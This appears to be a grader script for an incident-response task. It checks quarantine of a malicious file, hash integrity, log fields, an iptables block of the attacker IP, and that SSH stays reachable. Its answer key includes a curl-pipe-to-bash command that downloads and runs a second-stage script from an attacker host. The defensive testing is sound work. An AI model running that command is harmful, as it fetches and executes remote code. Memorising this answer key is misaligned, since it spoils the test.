import sys
import json
import os
import re
import subprocess
import hashlib
from pathlib import Path

workspace = sys.argv[1]

checks = []
total_score = 0.0

def add_check(name, passed, detail, weight=1.0):
    checks.append({"name": name, "passed": passed, "detail": detail})
    return weight if passed else 0.0

# ─── Ground Truth ─────────────────────────────────────────────────────────────
ATTACKER_IP = "185.220.101.47"
ARTIFACT_CONTENT = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8 + b"\x02\x00" + b"\xde\xad\xbe\xef" * 50
EXPECTED_HASH = hashlib.sha256(ARTIFACT_CONTENT).hexdigest()
PAYLOAD_DECODED = "curl -fsSL http://185.220.101.47/stage2.sh | bash"

# ─── CHECK 1: Quarantine file exists at correct path with correct extension ───
quarantine_path = Path("/root/quarantine/txn_update.vir")
try:
    if quarantine_path.exists():
        score = add_check(
            "quarantine_file_exists",
            True,
            f"Quarantine file found at {quarantine_path}",
            weight=1.5
        )
        total_score += score
    else:
        # Search for any .vir file in /root/quarantine
        alt = list(Path("/root/quarantine").rglob("*.vir")) if Path("/root/quarantine").exists() else []
        detail = f"Expected /root/quarantine/txn_update.vir not found. Found: {alt}"
        total_score += add_check("quarantine_file_exists", False, detail, weight=1.5)
except Exception as e:
    total_score += add_check("quarantine_file_exists", False, f"Exception: {e}", weight=1.5)

# ─── CHECK 2: Quarantined file has correct content (hash integrity) ───────────
try:
    if quarantine_path.exists():
        actual_hash = hashlib.sha256(quarantine_path.read_bytes()).hexdigest()
        passed = actual_hash == EXPECTED_HASH
        total_score += add_check(
            "quarantine_file_integrity",
            passed,
            f"Expected SHA256={EXPECTED_HASH[:16]}... Got={actual_hash[:16]}...",
            weight=1.5
        )
    else:
        total_score += add_check("quarantine_file_integrity", False, "File not found, cannot check hash", weight=1.5)
except Exception as e:
    total_score += add_check("quarantine_file_integrity", False, f"Exception: {e}", weight=1.5)

# ─── CHECK 3: Original artifact removed from /tmp ─────────────────────────────
try:
    original_gone = not Path("/tmp/txn_update").exists()
    total_score += add_check(
        "original_artifact_removed",
        original_gone,
        "Original /tmp/txn_update has been moved/removed" if original_gone else "/tmp/txn_update still present (not moved to quarantine)",
        weight=1.0
    )
except Exception as e:
    total_score += add_check("original_artifact_removed", False, f"Exception: {e}", weight=1.0)

# ─── CHECK 4: remediation_log.txt exists ─────────────────────────────────────
log_candidates = list(Path(workspace).rglob("remediation_log.txt"))
log_path = log_candidates[0] if log_candidates else None
try:
    if log_path and log_path.exists():
        total_score += add_check("remediation_log_exists", True, f"Found at {log_path}", weight=0.5)
    else:
        total_score += add_check("remediation_log_exists", False, "remediation_log.txt not found in workspace", weight=0.5)
except Exception as e:
    total_score += add_check("remediation_log_exists", False, f"Exception: {e}", weight=0.5)

# ─── CHECK 5: remediation_log contains required fields (Change Logging Req) ───
try:
    if log_path and log_path.exists():
        log_content = log_path.read_text(errors="replace").lower()
        
        # Must contain attacker IP
        has_ip = ATTACKER_IP in log_path.read_text(errors="replace")
        
        # Must contain evidence of date -u or UTC timestamp
        has_timestamp = bool(re.search(r"utc|date -u|\d{4}-\d{2}-\d{2}.*utc|mon|tue|wed|thu|fri|sat|sun", log_content))
        
        # Must contain sha256 hash reference
        has_hash = EXPECTED_HASH[:16].lower() in log_content or "sha256" in log_content
        
        # Must contain command documentation
        has_command = bool(re.search(r"iptables|sha256sum|mv /tmp|quarantine|kill|drop", log_content))
        
        # Must contain justification (not just commands)
        has_justification = bool(re.search(r"reason|justif|because|threat|malicious|attacker|brute.?force|comprom", log_content))
        
        # Must contain outcome
        has_outcome = bool(re.search(r"success|verified|confirm|blocked|quarantin|complet|moved|saved", log_content))
        
        all_fields = has_ip and has_timestamp and has_hash and has_command and has_justification and has_outcome
        detail = (
            f"attacker_ip={has_ip}, timestamp={has_timestamp}, hash_ref={has_hash}, "
            f"command={has_command}, justification={has_justification}, outcome={has_outcome}"
        )
        total_score += add_check("remediation_log_complete_fields", all_fields, detail, weight=2.0)
    else:
        total_score += add_check("remediation_log_complete_fields", False, "Log file missing", weight=2.0)
except Exception as e:
    total_score += add_check("remediation_log_complete_fields", False, f"Exception: {e}", weight=2.0)

# ─── CHECK 6: remediation_log references decoded payload ─────────────────────
try:
    if log_path and log_path.exists():
        raw = log_path.read_text(errors="replace")
        has_decoded = ("stage2.sh" in raw or "curl -fsSL" in raw or PAYLOAD_DECODED[:20] in raw)
        total_score += add_check(
            "remediation_log_payload_decoded",
            has_decoded,
            f"Log {'contains' if has_decoded else 'does not contain'} decoded payload evidence",
            weight=1.5
        )
    else:
        total_score += add_check("remediation_log_payload_decoded", False, "Log file missing", weight=1.5)
except Exception as e:
    total_score += add_check("remediation_log_payload_decoded", False, f"Exception: {e}", weight=1.5)

# ─── CHECK 7: iptables rule blocks attacker IP (INSERT at position 1) ─────────
try:
    result = subprocess.run(
        ["iptables", "-L", "INPUT", "-n", "--line-numbers"],
        capture_output=True, text=True, timeout=10
    )
    iptables_output = result.stdout

    # Check for DROP rule for attacker IP
    has_drop_rule = bool(re.search(
        rf"DROP\s+all\s+--\s+{re.escape(ATTACKER_IP)}\s+",
        iptables_output
    ))

    # Check it's at line 1 (INSERT -I INPUT 1 behavior)
    lines = [l.strip() for l in iptables_output.split("\n") if l.strip() and re.match(r'^\d+', l.strip())]
    at_position_1 = False
    if lines:
        first_rule = lines[0]
        at_position_1 = ATTACKER_IP in first_rule and "DROP" in first_rule

    detail = f"DROP rule present={has_drop_rule}, at_position_1={at_position_1}. iptables output (first 5 lines): {iptables_output[:300]}"
    total_score += add_check("iptables_block_rule_inserted", has_drop_rule and at_position_1, detail, weight=2.0)
except Exception as e:
    total_score += add_check("iptables_block_rule_inserted", False, f"Exception running iptables: {e}", weight=2.0)

# ─── CHECK 8: iptables rules persisted to /etc/iptables/rules.v4 ─────────────
try:
    rules_path = Path("/etc/iptables/rules.v4")
    if rules_path.exists():
        rules_content = rules_path.read_text(errors="replace")
        has_ip_in_rules = ATTACKER_IP in rules_content
        has_drop_in_rules = "DROP" in rules_content
        # iptables-save format: -A INPUT -s <IP> -j DROP or -I INPUT 1 -s <IP> -j DROP
        has_proper_rule = bool(re.search(
            rf"(-A INPUT|-I INPUT).*{re.escape(ATTACKER_IP)}.*DROP|DROP.*{re.escape(ATTACKER_IP)}",
            rules_content
        ))
        passed = has_ip_in_rules and has_drop_in_rules
        detail = f"rules.v4 exists={True}, has_ip={has_ip_in_rules}, has_drop={has_drop_in_rules}, proper_rule={has_proper_rule}"
        total_score += add_check("iptables_rules_persisted", passed, detail, weight=2.0)
    else:
        total_score += add_check("iptables_rules_persisted", False, "/etc/iptables/rules.v4 does not exist or is empty", weight=2.0)
except Exception as e:
    total_score += add_check("iptables_rules_persisted", False, f"Exception: {e}", weight=2.0)

# ─── CHECK 9: SSH not locked out (safety guardrail) ──────────────────────────
try:
    result = subprocess.run(
        ["iptables", "-L", "INPUT", "-n"],
        capture_output=True, text=True, timeout=10
    )
    ipt_out = result.stdout
    # Check there's no blanket DROP for port 22 (would lock out SSH)
    # Acceptable: DROP for specific attacker IP, but not DROP all on port 22
    blanket_drop_22 = bool(re.search(r"DROP\s+tcp\s+--\s+0\.0\.0\.0/0\s+0\.0\.0\.0/0.*dpt:22", ipt_out))
    # Also check that there's no default DROP policy without explicit SSH allow
    default_drop = bool(re.search(r"Chain INPUT.*policy DROP", ipt_out))
    ssh_unsafe = blanket_drop_22  # default_drop alone might be ok if SSH accept exists
    
    passed = not ssh_unsafe
    detail = f"blanket_drop_port22={blanket_drop_22}, default_drop_policy={default_drop}. SSH access preserved={passed}"
    total_score += add_check("ssh_not_locked_out", passed, detail, weight=1.0)
except Exception as e:
    # If iptables fails entirely, we can't verify - give partial
    total_score += add_check("ssh_not_locked_out", True, f"Could not verify iptables (non-blocking): {e}", weight=1.0)

# ─── Normalize score ──────────────────────────────────────────────────────────
MAX_SCORE = 1.5 + 1.5 + 1.0 + 0.5 + 2.0 + 1.5 + 2.0 + 2.0 + 1.0  # = 13.0
normalized = round(total_score / MAX_SCORE, 3)
passed_overall = normalized >= 0.70

print(json.dumps({
    "passed": passed_overall,
    "score": normalized,
    "checks": checks
}, indent=2))